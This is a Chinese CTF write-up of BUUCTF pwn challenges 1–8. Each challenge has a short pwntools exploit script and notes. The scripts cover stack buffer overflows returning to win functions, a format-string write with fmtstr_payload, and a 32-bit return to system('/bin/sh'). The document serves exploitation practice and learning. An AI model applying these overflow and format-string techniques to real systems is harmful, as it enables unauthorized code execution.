# buuctf刷题记录（1-20题）

## 1 test_nc

略

## 2 rip

```python
from pwn import *
p = process('./pwn1')
p.sendline(b'a'*0xF+b'b'*0x8+p64(0x40118a))
p.interactive()
```

## 3 warmup_csaw_2016

```python
from pwn import *
#p = process('./pwn')
p = remote('node5.buuoj.cn',28694)
payload = b'a'*72+p64(0x40060d)
p.sendline(payload)
p.interactive()
```

在本地打了半天以为我有问题，最后想起来system执行的是cat flag，不会有shell

## 4 ciscn_2019_n_1

两种思路，一种是覆盖返回地址，一种是覆盖v2

```python
from pwn import *
p = process('./pwn')
retaddr=0x4006BE
payload=b'a'*56+p32(retaddr)
p.sendline(payload)
p.interactive()
```

```python
from pwn import *
p = process('./pwn')
payload = b'a'*0x2c+p64(0x41348000)	# 可以看ida里面，有写v2的偏移
p.sendline(payload)
p.interactive()
```

## 5 pwn1_sctf_2016

限制了32字节的读入，但是后面的操作会把I变为you，留4字节给esp，输入20个I就行

```python
from pwn import *
p = process('./pwn')
payload = b'I'*20+b'a'*4+p32(0x8048F0D)
p.sendline(payload)
p.interactive()
```

*这次学好了，先在本地创建了一个`flag.txt`的文件*

## 6 jarvisoj_level0

ret2text不多说了(用了下自己的模板，有很多不需要)

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='amd64',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
p = process('./pwn')
#p = remote('',)
def dbg():
    gdb.attach(p)
    pause()
payload = b'a'*0x80+b'b'*0x8+p64(0x40059A)

p.sendline(payload)

p.interactive()
```

## 7 [第五空间2019 决赛]PWN5

有一个很好用的pwntools语法：

`fmtstr_payload(number,{addr:value})`

- `number`表示偏移字节数，`addr`为你要写入的地址，`value`为你要更改为的数值

这里分析题目可以发现，我们在buf段溢出，然后覆盖`dword_804C044`，再输入相同的覆盖值就行

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='amd64',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
p = process('./pwn')
def dbg():
    gdb.attach(p)
    pause()
p.recvuntil('name:')
payload = fmtstr_payload(11,{0x804C044:0x1})
p.sendline(payload)
p.recvuntil('passwd:')
p.sendline("1")
p.interactive()
```

## 8 jarvisoj_level2

一个32位的题目，和64位有些区别，但不多

**32位`system（）`利用栈传参，不用寄存器**.

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='amd64',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
p = process('./pwn')
def dbg():
    gdb.attach(p)
    pause()

sys = 0x8048320	# system的地址
binsh = 0x804A024	#binsh的地址
payload = b'a'*0x88+b'b'*0x4+p32(sys)+p32(1)+p32(binsh)
#垃圾数据+覆盖返回地址(32位是4字节）+system地址调用+随意参数填充+binsh填充
p.sendline(payload)
p.interactive()
```

